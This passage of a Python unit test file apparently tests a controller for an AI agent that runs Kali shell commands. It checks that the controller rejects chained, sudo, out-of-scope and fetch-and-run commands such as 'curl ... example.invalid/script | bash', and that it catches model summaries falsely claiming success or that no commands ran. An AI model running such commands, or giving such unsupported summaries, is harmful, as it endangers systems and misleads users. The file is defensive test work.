                      "REFLECTION_FOUND", "SECURITY_FINDING_VERIFIED"):
            self.assertIn(stage, deep_agent.SHELL_SYSTEM_PROMPT)
        self.assertIn("Execution evidence is cumulative and immutable", deep_agent.SHELL_SYSTEM_PROMPT)

    def test_no_command_claim_conflicts_with_a_submitted_timed_out_command(self):
        record = {
            "command": "nmap -Pn 192.0.2.10",
            "execution": {
                "execution_state": "timed_out", "exit_code": 124,
                "submitted_at": "2026-09-29T12:00:00Z",
            },
        }
        issue = deep_agent._summary_integrity_problem(
            "inspect host", [record], "No commands were executed.",
        )
        self.assertIn("completed or started command record", issue)

    def test_no_command_claim_is_rejected_when_submission_state_is_unknown(self):
        record = {
            "command": "curl http://127.0.0.1/",
            "execution": {
                "execution_state": "unknown", "exit_code": None,
                "submitted_at": None,
            },
        }
        issue = deep_agent._summary_integrity_problem(
            "inspect local service", [record],
            "No command ran because the connection closed.",
        )
        self.assertIn("could not determine whether a command was submitted or started", issue)

    def test_unverified_reflection_cannot_be_summarized_as_confirmed_xss(self):
        records = [{
            "command": "curl -s 'http://127.0.0.1/test.php?id=marker123456'",
            "facts": [{
                "stage": "REFLECTION_FOUND",
                "value": {"route": "/test.php", "parameter": "id",
                          "browser_execution_tested": False},
            }],
        }]
        issue = deep_agent._summary_integrity_problem(
            "inspect local web input", records,
            "Confirmed reflected XSS because the input appeared in the response.",
        )
        self.assertIn("no SECURITY_FINDING_VERIFIED fact", issue)
        self.assertIsNone(deep_agent._summary_integrity_problem(
            "inspect local web input", records,
            "No XSS was confirmed; the response only reflected the literal value.",
        ))

    def test_http_error_does_not_support_unqualified_website_success_claim(self):
        records = [{
            "command": "curl -sS -i http://127.0.0.1:9832/__agent_test_missing_route__",
            "purpose": "verify",
            "facts": [{
                "stage": "HTTP_RESPONSE_OBSERVED",
                "value": {
                    "scheme": "http", "host": "127.0.0.1", "port": 9832,
                    "route": "/__agent_test_missing_route__", "status": 404,
                },
            }],
        }]
        issue = deep_agent._summary_integrity_problem(
            "Is the website working?", records,
            "Yes — the site is working, but that specific route is missing.",
        )
        self.assertIn("HTTP 404", issue)
        self.assertIn("requested web outcome is unverified", issue)

    def test_http_error_allows_qualified_reachability_report(self):
        records = [{
            "command": "curl -sS -i http://127.0.0.1:9832/__agent_test_missing_route__",
            "purpose": "verify",
            "facts": [{
                "stage": "HTTP_RESPONSE_OBSERVED",
                "value": {
                    "scheme": "http", "host": "127.0.0.1", "port": 9832,
                    "route": "/__agent_test_missing_route__", "status": 404,
                },
            }],
        }]
        self.assertIsNone(deep_agent._summary_integrity_problem(
            "Is the website working?", records,
            "The server responded, but the requested route returned HTTP 404; the site's overall health is unverified.",
        ))

    def test_chat_replaces_site_success_claim_when_the_checked_route_returns_404(self):
        check = deep_agent._make_tool_call("run_kali_command", {
            "command": "curl -sS -i http://127.0.0.1:9832/__agent_test_missing_route__",
            "purpose": "verify",
            "hypothesis": "the requested website route responds successfully",
            "expected_result": "HTTP/1.1 200 OK",
        })
        kali, _, output = self._run_chat(
            ["Is the website working?"],
            [{"content": "", "tool_calls": [check]},
             {"content": "Yes — the site is working, but that specific route is missing.", "tool_calls": []}],
            run_records=[{"stdout": "HTTP/1.1 404 Not Found\r\nServer: Apache\r\n\r\n"}],
        )
        kali.run.assert_called_once_with("curl -sS -i http://127.0.0.1:9832/__agent_test_missing_route__")
        self.assertNotIn("Yes — the site is working", output)
        self.assertIn("HTTP 404", output)
        self.assertIn("Controller evidence does not confirm the requested outcome", output)

    def test_successful_http_response_supports_site_success_claim(self):
        records = [{
            "command": "curl -sS -i http://127.0.0.1:9832/",
            "purpose": "verify",
            "facts": [{
                "stage": "HTTP_RESPONSE_OBSERVED",
                "value": {
                    "scheme": "http", "host": "127.0.0.1", "port": 9832,
                    "route": "/", "status": 200,
                },
            }, {
                "stage": "WEB_APP_CONFIRMED",
                "value": {
                    "scheme": "http", "host": "127.0.0.1", "port": 9832,
                    "route": "/", "status": 200,
                },
            }],
        }]
        self.assertIsNone(deep_agent._summary_integrity_problem(
            "Is the website working?", records, "Yes — the website is working and returned HTTP 200.",
        ))

    def test_agent_rejects_http_on_recorded_tls_before_kali_submission(self):
        scan = "nmap -n -sT -sV --top-ports 100 --host-timeout 45s 127.0.0.1"
        wrong = "curl -sS -m 8 -i http://127.0.0.1:443/"
        corrected = "curl -sS -m 8 -i https://127.0.0.1:443/"
        replies = [{"content": "", "tool_calls": [deep_agent._make_tool_call(
            "run_kali_command", {"command": command, "purpose": "test",
                                 "hypothesis": hypothesis},
        )]} for command, hypothesis in ((scan, "service discovery"), (wrong, "web identity"),
                                       (corrected, "web identity"))]
        replies.append({"content": "HTTPS returned a login redirect; app identity is unknown.", "tool_calls": []})
        kali, calls, output = self._run_chat(["inspect local web services"], replies, run_records=[
            {"stdout": "Nmap scan report for 127.0.0.1\n443/tcp open ssl/https\n"},
            {"stdout": "HTTP/1.1 302 Found\r\nLocation: /app/login\r\n\r\n"},
        ])
        self.assertEqual([call.args[0] for call in kali.run.call_args_list], [scan, corrected])
        self.assertIn("recorded service evidence identifies TLS", calls[2][2][-1]["content"])
        self.assertNotIn("3 results failed or contradicted", output)

    def test_confirmation_turn_receives_controller_preserved_task_evidence(self):
        listeners = deep_agent._make_tool_call("run_kali_command", {
            "command": "ss -tlnp | head -50", "purpose": "inspect",
            "hypothesis": "local listeners", "expected_result": "9832",
        })
        probe = deep_agent._make_tool_call("run_kali_command", {
            "command": "curl -I http://127.0.0.1:9832/", "purpose": "verify",
            "hypothesis": "Apache HTTP endpoint responds", "expected_result": "HTTP/1.1 200 OK",
        })
        _kali, calls, _output = self._run_chat(
            ["inspect local web services", "GO ahaed"],
            [
                {"content": "", "tool_calls": [listeners]},
                {"content": "Apache is listening on port 9832.", "tool_calls": []},
                {"content": "", "tool_calls": [probe]},
                {"content": "The endpoint check completed.", "tool_calls": []},
            ],
            run_records=[{"stdout": "LISTEN 0 511 *:9832 *:* apache2\\n"},
                         {"stdout": "HTTP/1.1 200 OK\\n"}],
        )
        self.assertIn("Earlier evidence for this same user goal", calls[2][2][-1]["content"])
        self.assertIn("ss -tlnp | head -50", calls[2][2][-1]["content"])
        self.assertIn("apache2", calls[2][2][-1]["content"])
        self.assertIn('"stage": "SERVICE_FOUND"', calls[2][2][-1]["content"])

    def test_confirmation_does_not_repeat_goal_already_verified_on_prior_turn(self):
        preflight = deep_agent._make_tool_call("run_kali_command", {
            "command": "curl -fsS http://127.0.0.1/", "purpose": "verify",
            "hypothesis": "requested website already responds", "expected_result": "exit_code=0",
        })
        kali, calls, output = self._run_chat(
            ["host the site locally", "go ahead"],
            [
                {"content": "", "tool_calls": [preflight]},
                {"content": "The existing site responds.", "tool_calls": []},
            ],
            run_records=[{"stdout": "Portfolio page\\n"}],
        )
        kali.run.assert_called_once_with("curl -fsS http://127.0.0.1/")
        self.assertEqual(len(calls), 2)
        self.assertIn("This goal was verified on the previous turn", output)
        self.assertIn("No additional command ran", output)

    def test_no_action_on_confirmation_reports_prior_command_instead_of_erasing_it(self):
        kali, calls, output = self._run_chat(
            ["hostname", "go ahead"],
            [
                {"content": "Kali reported hostname.", "tool_calls": []},
                {"content": "No response requested.", "tool_calls": []},
                {"content": "No response requested.", "tool_calls": []},
                {"content": "No commands ran for this request.", "tool_calls": []},
            ],
        )
        kali.run.assert_called_once_with("hostname")
        self.assertNotIn("No commands ran for this request", output)
        self.assertIn("hostname", output)
        self.assertIn("execution evidence conflicts with the model summary", output)
        self.assertEqual([call[0] for call in calls], [False, True, True, False])

    def test_parallel_tool_calls_are_rejected_before_any_command_runs(self):
        first = deep_agent._make_tool_call("run_kali_command", {"command": "hostname"})
        second = deep_agent._make_tool_call("run_kali_command", {"command": "whoami"})
        corrected = deep_agent._make_tool_call("run_kali_command", {"command": "hostname"})
        kali, calls, _ = self._run_chat(
            ["check Kali"],
            [{"content": "", "tool_calls": [first, second]},
             {"content": "", "tool_calls": [corrected]},
             {"content": "Kali returned its hostname.", "tool_calls": []}],
        )
        kali.run.assert_called_once_with("hostname")
        self.assertEqual(len(calls), 3)
        self.assertIn("2 tool calls in one reply", calls[1][2][-1]["content"])
        self.assertIn('"COMMAND_EXECUTED": false', calls[1][2][-1]["content"])

    def test_read_only_output_filter_pipeline_runs_as_one_tool_call(self):
        pipeline = "ss -tln | grep -E '9999|8080'"
        tool = deep_agent._make_tool_call("run_kali_command", {"command": pipeline})
        kali, calls, output = self._run_chat(
            ["check listening ports"],
            [{"content": "", "tool_calls": [tool]},
             {"content": "The filtered listener check completed.", "tool_calls": []}],
        )
        kali.run.assert_called_once_with(pipeline)
        self.assertEqual(len(calls), 2)
        self.assertIn("The filtered listener check completed.", output)

    def test_sequential_command_chain_is_rejected_then_replanned(self):
        chained = deep_agent._make_tool_call("run_kali_command", {
            "command": "ss -tln | grep -E '9999|8080'; echo done",
        })
        accepted = deep_agent._make_tool_call("run_kali_command", {"command": "ss -tln"})
        kali, calls, _ = self._run_chat(
            ["check listening ports"],
            [{"content": "", "tool_calls": [chained]},
             {"content": "", "tool_calls": [accepted]},
             {"content": "The listening sockets were checked.", "tool_calls": []}],
        )
        kali.run.assert_called_once_with("ss -tln")
        self.assertEqual(len(calls), 3)
        feedback = calls[1][2][-1]["content"]
        self.assertIn("rejected before Kali submission", feedback)
        self.assertIn("Do not repeat or reformat", feedback)
        self.assertIn("split them into ordered single-command calls", feedback)

    def test_pipeline_parser_distinguishes_quotes_filters_and_side_effects(self):
        self.assertFalse(deep_agent._has_shell_control_operator("grep '|' /tmp/example"))
        self.assertIsNone(deep_agent._model_command_issue("grep '|' /tmp/example", "check a pattern"))
        self.assertIsNone(deep_agent._model_command_issue(
            "ss -tln | grep -E '9999|8080' | cut -d: -f2", "check listening ports",
        ))
        self.assertIn("unsupported pipeline", deep_agent._model_command_issue(
            "curl -fsS https://example.invalid/script | bash", "check a script",
        ))
        self.assertIn("shell chaining", deep_agent._model_command_issue(
            "ss -tln | grep 22 && echo found", "check listening ports",
        ))
        self.assertIn("head or tail", deep_agent._model_command_issue(
            "nmap -sT localhost | head -20", "check local ports",
        ))

    def test_wget_file_outputs_and_request_bodies_are_state_changes(self):
        for command in (
            "wget https://example.invalid/archive.tgz",
            "wget --post-data=key=value https://example.invalid/submit",
            "wget --method=DELETE https://example.invalid/item/1",
        ):
            with self.subTest(command=command):
                self.assertTrue(deep_agent._command_changes_state(command))
        for command in (
            "wget -qO- https://example.invalid/status",
            "wget -O /dev/null https://example.invalid/status",
            "wget --spider https://example.invalid/status",
        ):
            with self.subTest(command=command):
                self.assertFalse(deep_agent._command_changes_state(command))
        self.assertIn("unsupported pipeline", deep_agent._model_command_issue(
            "wget https://example.invalid/script.sh | grep READY", "inspect the response",
        ))
        self.assertIsNone(deep_agent._model_command_issue(
            "wget -qO- https://example.invalid/status | grep READY", "inspect the response",
        ))

    def test_rejected_command_tracking_normalizes_spacing_and_respects_case(self):
        workflow = kali_workflow.KaliWorkflow("check ports")
        self.assertFalse(workflow.note_rejected_command("ss -tln|grep -E '9999|8080'"))
        self.assertTrue(workflow.note_rejected_command("ss -tln | grep -E '9999|8080'"))
        self.assertFalse(workflow.note_rejected_command("grep Foo file.txt"))
        self.assertFalse(workflow.note_rejected_command("grep foo file.txt"))

    def test_rejected_reason_tracking_stops_different_commands_with_same_issue(self):
        workflow = kali_workflow.KaliWorkflow("change Apache port")
        reason = "Preflight check required before state change."
        self.assertFalse(workflow.note_rejected_issue(reason))
        self.assertTrue(workflow.note_rejected_issue("  preflight   CHECK required before state change. "))
        self.assertFalse(workflow.note_rejected_issue("a different issue"))

    def test_second_preflight_rejection_stops_write_variants(self):
        inspect = deep_agent._make_tool_call("run_kali_command", {
            "command": "ss -tlnp | grep -E '9832|apache2'",
            "purpose": "inspect",
        })
        first_write = deep_agent._make_tool_call("run_kali_command", {
            "command": 'echo "Listen 80\\nListen 9832" > /etc/apache2/ports.conf',
            "purpose": "change",
        })
        alternate_write = deep_agent._make_tool_call("run_kali_command", {
            "command": "printf 'Listen 80\\nListen 9832\\n' > /etc/apache2/ports.conf",
            "purpose": "change",
        })
        kali, calls, output = self._run_chat(
            ["Make Apache listen on port 9832"],
            [{"content": "", "tool_calls": [inspect]},
             {"content": "", "tool_calls": [first_write]},
             {"content": "", "tool_calls": [alternate_write]},
             {"content": "", "tool_calls": []}],
            run_records=[{"stdout": "LISTEN 0 511 *:80 *:* apache2\\n"}],
        )
        kali.run.assert_called_once_with("ss -tlnp | grep -E '9832|apache2'")
        self.assertIn("Recovery options", calls[-1][2][-1]["content"])
        self.assertIn("no actionable response", output)
        self.assertIn("requested outcome remains unverified", output)
        self.assertEqual(len(deep_agent.CONTROLLER_DIAGNOSTICS), 3)

    def test_controller_rejection_menu_offered_before_workflow_stops(self):
        rejected_change = deep_agent._make_tool_call("run_kali_command", {
            "command": "systemctl restart apache2",
            "purpose": "change",
        })
        kali, calls, output = self._run_chat(
            ["restart Apache"],
            [
                {"content": "", "tool_calls": [rejected_change]},
                {"content": "", "tool_calls": [rejected_change]},
                {"content": "", "tool_calls": []},
            ],
        )

        kali.run.assert_not_called()
        self.assertIn("Recovery options", calls[-1][2][-1]["content"])
        self.assertIn("bounded no-action recovery attempt", output)
        self.assertIn("requested outcome remains unverified", output)

    def test_controller_rejection_history_survives_confirmation_turns(self):
        rejected = deep_agent._make_tool_call("run_kali_command", {
            "command": "ss -tln | grep 22 && echo done",
        })
        accepted = deep_agent._make_tool_call("run_kali_command", {
            "command": "ss -tln",
        })
        kali, calls, output = self._run_chat(
            ["check listening ports", "go ahead"],
            [
                {"content": "", "tool_calls": [rejected]},
                {"content": "No listener check ran.", "tool_calls": []},
                {"content": "", "tool_calls": [rejected]},
                {"content": "", "tool_calls": [accepted]},
                {"content": "The listener check completed.", "tool_calls": []},
            ],
        )

        kali.run.assert_called_once_with("ss -tln")
        self.assertIn("Earlier controller rejections for this same goal", calls[2][2][-1]["content"])
        self.assertIn("Recovery options", calls[3][2][-1]["content"])
        self.assertIn("No Kali command ran for this request", output)

    def test_controller_recovery_round_is_bounded_across_confirmations(self):
        rejected = deep_agent._make_tool_call("run_kali_command", {
            "command": "ss -tln | grep 22 && echo done",
        })
        kali, calls, _output = self._run_chat(
            ["check listening ports", "go ahead", "go ahead"],
            [
                {"content": "", "tool_calls": [rejected]},
                {"content": "No listener check ran.", "tool_calls": []},
                {"content": "", "tool_calls": [rejected]},
                {"content": "The check is still outstanding.", "tool_calls": []},
                {"content": "", "tool_calls": [rejected]},
            ],
        )

        kali.run.assert_not_called()
        self.assertEqual(len(calls), 5)
        self.assertIn("Recovery options", calls[3][2][-1]["content"])
        self.assertNotIn("Recovery options", calls[4][2][-1]["content"])

    def test_distinct_controller_rejections_exhaust_budget_across_confirmations(self):
        rejected_commands = [
            "echo first && echo second",
            "apt-get install example-package",
            "bash -c id",
            "curl -fsS <https://example.com>",
        ]
        replies = [
            {"content": "", "tool_calls": [deep_agent._make_tool_call(
                "run_kali_command", {"command": command},
            )]}
            for command in rejected_commands
        ]
        replies.append({"content": "No response requested.", "tool_calls": []})
        kali, calls, output = self._run_chat(
            ["inspect local services", "go ahead"], replies,
        )

        kali.run.assert_not_called()
        self.assertEqual(len(calls), 3)
        self.assertIn("consecutive controller-rejected tool requests", output.lower())

    def test_controller_rejection_budget_summary_preserves_prior_command_evidence(self):
        rejected_commands = [
            "echo first && echo second",
            "apt-get install example-package",
            "bash -c id",
        ]
        replies = [
            {"content": "The hostname command completed.", "tool_calls": []},
            *[
                {"content": "", "tool_calls": [deep_agent._make_tool_call(
                    "run_kali_command", {"command": command},
                )]}
                for command in rejected_commands
            ],
            {"content": "The earlier hostname result remains recorded; the later proposals were rejected.",
             "tool_calls": []},
        ]
        kali, calls, _output = self._run_chat(["hostname", "go ahead"], replies)

        kali.run.assert_called_once_with("hostname")
        summary = json.loads(calls[-1][2][-1]["content"])
        self.assertIn("No further Kali command ran", summary["stop_reason"])
        self.assertNotIn("No Kali command ran:", summary["stop_reason"])
        self.assertEqual(summary["recorded_results"][0]["command"], "hostname")

    def test_successful_tool_action_resets_controller_rejection_streak(self):
        rejected_commands = [
            "echo first && echo second",
            "apt-get install example-package",
            "bash -c id",
        ]
        replies = [
            {"content": "", "tool_calls": [deep_agent._make_tool_call(
                "run_kali_command", {"command": rejected_commands[0]},
            )]},
            {"content": "", "tool_calls": [deep_agent._make_tool_call(
                "run_kali_command", {"command": "ss -tln"},
            )]},
            *[
                {"content": "", "tool_calls": [deep_agent._make_tool_call(
                    "run_kali_command", {"command": command},
                )]}
                for command in rejected_commands[1:]
            ],
            {"content": "", "tool_calls": [deep_agent._make_tool_call(
                "run_kali_command", {"command": "hostname"},
            )]},
            {"content": "The listener and hostname checks ran.", "tool_calls": []},
        ]
        kali, calls, output = self._run_chat(["inspect local services"], replies)

        self.assertEqual([call.args[0] for call in kali.run.call_args_list], ["ss -tln", "hostname"])
        self.assertEqual(len(calls), 6)
        self.assertNotIn("repair budget", output.lower())

    def test_promise_is_retried_before_reporting_no_action(self):
        tool = deep_agent._make_tool_call("run_kali_command", {"command": "ss -tulpn"})
        kali, calls, _ = self._run_chat(
            ["check listening ports"],
            [{"content": "I'll check.", "tool_calls": []},
             {"content": "", "tool_calls": [tool]},
             {"content": "A service is listening.", "tool_calls": []}],
        )
        kali.run.assert_called_once_with("ss -tulpn")
        self.assertEqual([item[0] for item in calls], [True, True, True])

    def test_missing_scan_target_asks_before_any_command(self):
        kali, calls, output = self._run_chat(["scan ports"], [])
        kali.run.assert_not_called()
        self.assertEqual(calls, [])
        self.assertIn("Which host should I scan?", output)

    def test_acknowledgment_is_not_accepted_as_a_scan_target(self):
        kali, calls, output = self._run_chat(["scan ports", "yes"], [])
        kali.run.assert_not_called()
        self.assertEqual(calls, [])
        self.assertIn("Please give the host IP address or hostname", output)

    def test_scan_target_reply_uses_bounded_unprivileged_scan(self):
        kali, calls, _ = self._run_chat(
            ["scan ports", "Kali itself"],
            [{"content": "The quick scan completed.", "tool_calls": []}],
        )
        kali.run.assert_called_once_with("nmap -n -sT --open --top-ports 100 --host-timeout 45s 127.0.0.1")
        self.assertEqual([item[0] for item in calls], [False])

    def test_numbered_scan_option_runs_the_selected_target(self):
        first = deep_agent._make_tool_call("run_kali_command", {"command": "hostname -I"})
        kali, _, _ = self._run_chat(
            ["check Kali IP", "Do 1"],
            [{"content": "", "tool_calls": [first]},
             {"content": "1. Scan this Kali VM itself: `nmap 10.0.2.15`\n2. Scan another host", "tool_calls": []},
             {"content": "The selected scan completed.", "tool_calls": []}],
        )
        self.assertEqual(kali.run.call_count, 2)
        self.assertEqual(kali.run.call_args.args[0], "nmap -n -sT --open --top-ports 100 --host-timeout 45s 10.0.2.15")

    def test_model_sudo_scan_is_rejected_and_replanned(self):
        bad = deep_agent._make_tool_call("run_kali_command", {"command": "sudo nmap -p- localhost | tail -20"})
        good = deep_agent._make_tool_call("run_kali_command", {
            "command": "nmap -n -sT -F --host-timeout 45s 127.0.0.1",
            "purpose": "test", "hypothesis": "bounded scan completes", "expected_result": "exit_code=0",
        })
        kali, calls, _ = self._run_chat(
            ["inspect Kali network services"],
            [{"content": "", "tool_calls": [bad]},
             {"content": "", "tool_calls": [good]},
             {"content": "The scan completed.", "tool_calls": []}],
        )
        kali.run.assert_called_once_with("nmap -n -sT -F --host-timeout 45s 127.0.0.1")
        self.assertEqual([item[0] for item in calls], [True, True, True])

    def test_followup_tool_call_runs_and_is_visible_to_model(self):
        first = deep_agent._make_tool_call("run_kali_command", {"command": "which nmap"})
        second = deep_agent._make_tool_call("run_kali_command", {"command": "which curl"})
        kali, calls, _ = self._run_chat(
            ["check Kali dependencies"],
            [{"content": "", "tool_calls": [first]},
             {"content": "", "tool_calls": [second]},
             {"content": "Both tools are installed.", "tool_calls": []}],
        )
        self.assertEqual([entry.args[0] for entry in kali.run.call_args_list], ["which nmap", "which curl"])
        self.assertEqual([item[0] for item in calls], [True, True, True])
        self.assertEqual(calls[-1][2][-2]["role"], "tool")
        self.assertEqual(calls[-1][2][-1]["role"], "user")
        self.assertIn("Controller-owned task state:", calls[-1][2][-1]["content"])
        for _, _, request_messages in calls:
            self.assertEqual(request_messages[0]["content"], deep_agent.SHELL_SYSTEM_PROMPT)
        self.assertNotEqual(calls[0][2][-1]["content"], calls[-1][2][-1]["content"])

    def test_completed_tasks_compact_old_results_before_next_action(self):
        commands = [f"cat /tmp/result-{index}.log" for index in range(4)]
        streams = [f"result {index}\n" + "recorded detail\n" * 350 for index in range(4)]
        kali, calls, _ = self._run_chat(
            [*commands, "what is my ip"],
            [*[{"content": "The file was read.", "tool_calls": []} for _ in commands],
             {"content": "Which interface's IP address do you need?", "tool_calls": []}],
            run_records=[{"stdout": stream} for stream in streams],
        )
        self.assertEqual(kali.run.call_count, 4)
        self.assertTrue(calls[-1][0])
        action_messages = calls[-1][2]
        results = [message for message in action_messages if message.get("role") == "tool"]
        self.assertEqual(len(results), 4)
        self.assertTrue(json.loads(results[0]["content"])["evidence_compact"])
        self.assertTrue(all("command_evidence" in json.loads(message["content"])
                            for message in results[1:]))
        records = deep_agent._execution_records(action_messages)
        self.assertEqual([record["command"] for record in records], commands)
        for record, stream in zip(records, streams):
            self.assertIn(stream, record["output"])
            saved = deep_agent.EVIDENCE_LEDGER.command_by_evidence_id(record["evidence_id"])
            self.assertEqual(saved.stdout, stream)

    def test_tool_request_after_explicit_command_gets_grounded_fallback(self):
        extra = deep_agent._make_tool_call("run_kali_command", {"command": "which curl"})
        kali, _, output = self._run_chat(["which nmap"], [{"content": "", "tool_calls": [extra]}])
        kali.run.assert_called_once_with("which nmap")
        self.assertIn("no additional command ran.", output)

    def test_greeting_does_not_open_kali(self):
        kali, calls, _ = self._run_chat(["hi"], [{"content": "Hello.", "tool_calls": []}], shell=False)
        kali.run.assert_not_called()
        self.assertEqual([item[0] for item in calls], [False])

    def test_ordinary_chat_request_does_not_offer_kali_tool(self):
        kali, calls, _ = self._run_chat(["show me a recipe"], [{"content": "Here is one.", "tool_calls": []}], shell=False)
        kali.run.assert_not_called()
        self.assertEqual([item[0] for item in calls], [False])

    def test_chat_mode_tool_request_points_to_shell_mode(self):
        tool = deep_agent._make_tool_call("run_kali_command", {"command": "whoami"})
        kali, calls, output = self._run_chat(["kali"], [{"content": "", "tool_calls": [tool]}], shell=False)
        kali.run.assert_not_called()
        self.assertEqual([item[0] for item in calls], [False])
        self.assertIn("Type /shell", output)

    def test_chat_mode_command_is_redirected_without_model_call(self):
        kali, calls, output = self._run_chat(["ip a"], [], shell=False)
        kali.run.assert_not_called()
        self.assertEqual(calls, [])
        self.assertIn("Switch to /shell", output)

    def test_interactive_sudo_shell_is_rejected(self):
        kali, calls, output = self._run_chat(["escalate privilage", "kali", "sudo su"], [])
        kali.run.assert_not_called()
        self.assertEqual(calls, [])
        self.assertIn("Interactive root shells are not supported", output)

    def test_direct_sudo_command_reaches_kali(self):
        kali, calls, output = self._run_chat(["sudo nmap localhost"], [])
        kali.run.assert_called_once_with("sudo nmap localhost")
        self.assertEqual([item[0] for item in calls], [False])
        self.assertIn("Recorded results follow", output)

    def test_kali_prefix_allows_one_sudo_command_but_blocks_chaining(self):
        kali, calls, output = self._run_chat(["/kali sudo id"], [])
        kali.run.assert_called_once_with("sudo id")
        self.assertEqual([item[0] for item in calls], [False])
        self.assertIn("Recorded results follow", output)

        kali, calls, output = self._run_chat(["/kali id; sudo whoami"], [])
        kali.run.assert_not_called()
        self.assertEqual(calls, [])
        self.assertIn("No Kali command ran", output)
        self.assertIn("sudo must be the first and only command", output)

    def test_exploit_scope_rejects_chained_or_additional_hosts(self):
        target = "192.168.56.101"
        bad_commands = (
            f"nmap -n -sT {target} otherhost",
            f"nmap -n -sT {target}; curl https://outside.example",
            "curl http://outside-host/",
        )
        for command in bad_commands:
            with self.subTest(command=command):
                issue = deep_agent._model_command_issue(command, "validate this lab", target)
                self.assertIsNotNone(issue)

    def test_exploit_scope_accepts_a_single_bounded_target(self):
        target = "192.168.56.101"
        command = f"nmap -n -sT -sV --top-ports 100 --host-timeout 45s {target}"
        self.assertIsNone(deep_agent._model_command_issue(command, "validate this lab", target))

    def test_exploit_followup_scan_uses_only_observed_open_ports(self):
        target = "192.168.56.101"
        observed = {21, 22, 80}
        repeated_top_ports = f"nmap -n -sT -sV --top-ports 100 --host-timeout 45s {target}"
        issue = deep_agent._model_command_issue(
            repeated_top_ports, "validate this lab", target, known_tcp_ports=observed,
        )
        self.assertIn("select previously observed open TCP ports", issue)

        scoped = f"nmap -n -sT -sV -p 21,22,80 --host-timeout 45s {target}"
        self.assertIsNone(deep_agent._model_command_issue(
            scoped, "validate this lab", target, known_tcp_ports=observed,
        ))

        unobserved = f"nmap -n -sT -sV -p 21,22,80,445 --host-timeout 45s {target}"
        issue = deep_agent._model_command_issue(
            unobserved, "validate this lab", target, known_tcp_ports=observed,
        )
        self.assertIn("unobserved ports", issue)

    def test_package_install_plans_do_not_hide_failures_or_use_coreutils_install(self):
        chained = "apt-get update 2>&1 | tail -8; echo done; apt-get install -y google-chrome-stable"
        issue = deep_agent._model_command_issue(chained, "install google chrome")
        self.assertIn("one command at a time", issue)
        issue = deep_agent._model_command_issue("sudo install google chrome", "install google chrome")
        self.assertIn("copies files", issue)
        self.assertIsNone(deep_agent._model_command_issue(
            "apt-cache policy google-chrome-stable", "install google chrome",
        ))
        self.assertIn("apt-key is unavailable", deep_agent._model_command_issue(
            "apt-key add /tmp/key.pub", "install google chrome",
        ))
        self.assertIn("Markdown link markup", deep_agent._model_command_issue(
            "wget -q <https://dl.google.com/linux/linux_signing_key.pub> -O /tmp/key_[key.pub](http://key.pub)",
            "install google chrome",
        ))

    def test_workflow_tracks_admission_repetition_and_terminal_failures(self):
        workflow = deep_agent.KaliWorkflow("test", max_commands=2)
        self.assertIsNone(workflow.begin("hostname"))
        self.assertIsNone(workflow.finish_command({
            "execution_state": "completed", "exit_code": 0, "timed_out": False,
        }))
        self.assertIn("already attempted", workflow.begin("hostname"))
        self.assertIsNone(workflow.begin("whoami"))
        self.assertIn("timed out", workflow.finish_command({
            "execution_state": "timed_out", "exit_code": 124, "timed_out": True,
        }))
        self.assertIs(workflow.state, deep_agent.WorkflowState.BLOCKED)
        self.assertIn("timed out", workflow.stop_reason)

    def test_workflow_carries_hypothesis_budget_and_command_dedup_across_turns(self):
        prior = [{
            "command": "curl -sS http://127.0.0.1:55000/",
            "cwd": "/home/kali", "execution_mode": "one_shot",
            "purpose": "test", "hypothesis": "wazuh api uses http",
            "expected_result": "HTTP/1.1 200 OK",
            "execution": {
                "execution_state": "completed", "exit_code": 52,
                "expected_result_match": False, "operation": "run_kali_command",
                "cwd": "/home/kali",
            },
        }]
        workflow = deep_agent.KaliWorkflow("inspect the Wazuh API", max_commands=4)
        workflow.seed_task_history(prior)
        self.assertEqual(workflow.prior_command_count, 1)
        self.assertEqual(workflow.prior_test_command_count, 1)
        self.assertEqual(workflow.hypothesis_attempts["wazuh api uses http"], 1)
        self.assertEqual(workflow.hypothesis_failures["wazuh api uses http"], 1)
        self.assertIn("already attempted", workflow.begin(
            "curl -sS http://127.0.0.1:55000/", cwd="/home/kali",
            purpose="test", hypothesis="wazuh api uses http",
            expected_result="HTTP/1.1 200 OK",
        ))
        self.assertIsNone(workflow.begin(
            "curl -k -sS https://127.0.0.1:55000/", cwd="/home/kali",
            purpose="test", hypothesis="wazuh api uses https",
            expected_result="HTTP/1.1 200 OK",
        ))

    def test_workflow_stops_at_existing_task_test_budget_after_continuation(self):
        prior = [{
            "command": f"curl -sS http://127.0.0.1:55000/{index}",
            "purpose": "test", "hypothesis": "same protocol hypothesis",
            "execution": {"execution_state": "completed", "exit_code": 0,
                          "expected_result_match": False},
        } for index in range(kali_workflow.MAX_TEST_COMMANDS_PER_WORKFLOW)]
        workflow = deep_agent.KaliWorkflow("inspect a local API")
        workflow.seed_task_history(prior)
        issue = workflow.begin(
            "curl -I https://127.0.0.1:55000/", purpose="test",
            hypothesis="new protocol hypothesis", expected_result="HTTP/1.1 200 OK",
        )
        self.assertIn("9-test investigation limit", issue)

    def test_incomplete_verification_remains_pending_across_confirmation(self):
        command = "curl -fsS http://127.0.0.1:8000/"
        prior = [{
            "command": command, "purpose": "verify", "expected_result": "exit_code=0",
            "execution": {
                "execution_state": "timed_out", "exit_code": 124,
                "submitted_at": "2026-09-29T12:00:00Z", "timed_out": True,
            },
        }]
        workflow = deep_agent.KaliWorkflow(
            "host the local site", requires_goal_check=True,
            requires_preflight_check=True,
        )
        workflow.seed_task_history(prior)
        self.assertTrue(workflow.preflight_check_run)
        self.assertIsNone(workflow.preflight_condition_met)
        self.assertTrue(workflow.verification_required_before_next_action)
        self.assertIn("inconclusive", workflow.begin(
            "systemctl restart apache2", purpose="change",
        ))
        self.assertIsNone(workflow.begin(
            command, purpose="verify", expected_result="exit_code=0",
        ))

    def test_research_budget_carries_across_confirmation_turns(self):
        prior = [
            {"tool_name": "web_search", "query": f"vendor docs {index}", "purpose": "research"}
            for index in range(kali_workflow.MAX_RESEARCH_CALLS_PER_WORKFLOW)
        ]
        workflow = deep_agent.KaliWorkflow("research a service")
        workflow.seed_task_history(prior)
        issue = workflow.begin_research()
        self.assertIn("research limit", issue)

    def test_distinct_web_searches_survive_task_record_merging(self):
        messages = [{"role": "user", "content": "research this service"}]
        queries = ("vendor service", "service tls", "service documentation")
        for query in queries:
            # Some models reuse a tool-call ID across separate turns.
            call_id = "reused-search-id"
            call = deep_agent._make_tool_call(
                "web_search", {"query": query, "max_results": 5}, call_id,
            )
            messages.append({"role": "assistant", "content": "", "tool_calls": [call]})
            messages.append({
                "role": "tool", "tool_call_id": call_id,
